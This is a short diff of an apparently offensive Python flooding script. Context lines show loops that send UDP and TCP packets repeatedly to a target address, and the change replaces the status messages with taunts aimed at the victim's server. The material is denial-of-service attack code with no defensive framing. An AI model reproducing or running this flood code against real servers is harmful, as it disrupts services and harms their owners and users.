@@ -30,7 +30,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" ZIEL ATTACKING TO +ip +port")
+			print(i +" ZIEL ATTACKING TO YOUR SERVER SAMPE MT YA SAYANK")
 		except:
 			print("[X] AMFUN SAYANK")
 
@@ -44,7 +44,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" ZIEL ATTACKING TO +ip +port!")
+			print(i +" ZIEL ATTACKING TO YOUR SERVER SAMPE MT YA SAYANK")
 		except:
 			s.close()
 			print("[X] AMFUN SAYANK")
